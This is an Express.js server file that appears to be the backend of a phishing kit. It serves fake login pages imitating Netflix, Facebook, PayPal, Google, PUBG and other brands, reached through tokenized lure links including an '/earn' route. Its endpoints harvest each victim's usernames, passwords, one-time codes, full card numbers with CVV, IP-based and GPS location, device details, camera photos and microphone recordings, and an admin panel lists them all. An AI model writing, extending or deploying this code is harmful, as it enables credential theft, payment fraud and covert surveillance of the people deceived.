const express = require('express');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Data storage
const DATA_DIR = path.join(__dirname, 'data');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const PHOTOS_DIR = path.join(__dirname, 'public', 'captures', 'photos');
const AUDIO_DIR = path.join(__dirname, 'public', 'captures', 'audio');

// Ensure directories exist
[DATA_DIR, PHOTOS_DIR, AUDIO_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

function loadCaptures() {
    if (fs.existsSync(CAPTURES_FILE)) {
        return JSON.parse(fs.readFileSync(CAPTURES_FILE, 'utf8'));
    }
    return [];
}

function saveCaptures(data) {
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(data, null, 2));
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.ip;
}

async function getLocationFromIP(ip) {
    try {
        if (ip === '127.0.0.1' || ip === '::1' || ip.includes('192.168.') || ip.includes('10.')) {
            return { lat: 0, lon: 0, city: 'Local', country: 'Local', region: 'Local', isp: 'Local Network' };
        }
        const resp = await axios.get(`http://ip-api.com/json/${ip}?fields=lat,lon,city,country,regionName,isp`, { timeout: 5000 });
        if (resp.data && resp.data.status !== 'fail') {
            return {
                lat: resp.data.lat || 0,
                lon: resp.data.lon || 0,
                city: resp.data.city || 'Unknown',
                country: resp.data.country || 'Unknown',
                region: resp.data.regionName || 'Unknown',
                isp: resp.data.isp || 'Unknown'
            };
        }
    } catch (e) { console.log('IP lookup failed:', e.message); }
    return { lat: 0, lon: 0, city: 'Unknown', country: 'Unknown', region: 'Unknown', isp: 'Unknown' };
}

// Set view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// ===== ADMIN ROUTES =====
app.get('/', (req, res) => res.redirect('/admin'));

app.get('/admin', (req, res) => {
    res.render('admin');
});

app.get('/settings', (req, res) => {
    res.render('settings');
});

// ===== API ROUTES =====
app.get('/api/captures', (req, res) => {
    res.json(loadCaptures());
});

app.post('/api/clear', (req, res) => {
    saveCaptures([]);
    res.json({ status: 'cleared' });
});

app.post('/api/delete/:id', (req, res) => {
    let captures = loadCaptures();
    captures = captures.filter(c => c.id !== req.params.id);
    saveCaptures(captures);
    res.json({ status: 'deleted' });
});

// ===== CAPTURE ENDPOINTS =====
app.post('/api/capture/init', async (req, res) => {
    const ip = getClientIP(req);
    const location = await getLocationFromIP(ip);

    const capture = {
        id: uuidv4().substring(0, 8),
        token: req.body.token || '',
        template: req.body.template || 'unknown',
        ip: ip,
        user_agent: req.headers['user-agent'] || '',
        referrer: req.headers['referer'] || '',
        timestamp: new Date().toISOString(),
        location: location,
        device: req.body.device || {},
        battery: req.body.battery || {},
        network: req.body.network || {},
        screen: req.body.screen || {},
        credentials: {},
        photos: [],
        audio: null,
        card_data: {},
        status: 'active'
    };

    let captures = loadCaptures();
    captures.unshift(capture);
    saveCaptures(captures);

    res.json({ status: 'ok', capture_id: capture.id });
});

app.post('/api/capture/photo', (req, res) => {
    const { capture_id, image } = req.body;
    if (!image || !capture_id) return res.status(400).json({ status: 'error' });

    const imgName = `${capture_id}_${Date.now()}.jpg`;
    const imgPath = path.join(PHOTOS_DIR, imgName);

    try {
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, '').replace(/^data:image\/png;base64,/, '');
        fs.writeFileSync(imgPath, Buffer.from(base64Data, 'base64'));
    } catch (e) { return res.status(400).json({ status: 'error' }); }

    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) {
        cap.photos.push(`/captures/photos/${imgName}`);
        saveCaptures(captures);
    }

    res.json({ status: 'ok', photo: imgName });
});

app.post('/api/capture/credentials', (req, res) => {
    const { capture_id, username, password, email, phone, otp } = req.body;
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) {
        cap.credentials = { username, password, email, phone, otp };
        saveCaptures(captures);
    }
    res.json({ status: 'ok' });
});

app.post('/api/capture/card', (req, res) => {
    const { capture_id, card_number, expiry, cvv, name, zip } = req.body;
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) {
        cap.card_data = { card_number, expiry, cvv, name, zip };
        saveCaptures(captures);
    }
    res.json({ status: 'ok' });
});

app.post('/api/capture/audio', (req, res) => {
    const { capture_id, audio } = req.body;
    if (!audio || !capture_id) return res.status(400).json({ status: 'error' });

    const audioName = `${capture_id}_${Date.now()}.webm`;
    const audioPath = path.join(AUDIO_DIR, audioName);

    try {
        const base64Data = audio.replace(/^data:audio\/webm;base64,/, '');
        fs.writeFileSync(audioPath, Buffer.from(base64Data, 'base64'));
    } catch (e) { return res.status(400).json({ status: 'error' }); }

    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) {
        cap.audio = `/captures/audio/${audioName}`;
        saveCaptures(captures);
    }

    res.json({ status: 'ok' });
});

app.post('/api/capture/location', (req, res) => {
    const { capture_id, lat, lon, accuracy } = req.body;
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) {
        cap.gps_location = { lat, lon, accuracy, timestamp: new Date().toISOString() };
        saveCaptures(captures);
    }
    res.json({ status: 'ok' });
});

// ===== TEMPLATE ROUTES =====
const templates = ['netflix', 'facebook', 'instagram', 'tiktok', 'pubg', 'freefire', 'paypal', 'google', 'snapchat', 'wifi', 'gaming'];

templates.forEach(tmpl => {
    app.get(`/${tmpl}/:token`, (req, res) => {
        res.render(tmpl, { token: req.params.token, template: tmpl });
    });
});

// Also support generic /e/earn route like in video
app.get('/earn', (req, res) => {
    const { user, target, template } = req.query;
    const tmpl = template || 'netflix';
    if (templates.includes(tmpl)) {
        res.render(tmpl, { token: target || user || 'default', template: tmpl });
    } else {
        res.render('netflix', { token: target || user || 'default', template: 'netflix' });
    }
});

app.listen(PORT, () => {
    console.log(`SHADOW OFFICIAL running on port ${PORT}`);
});
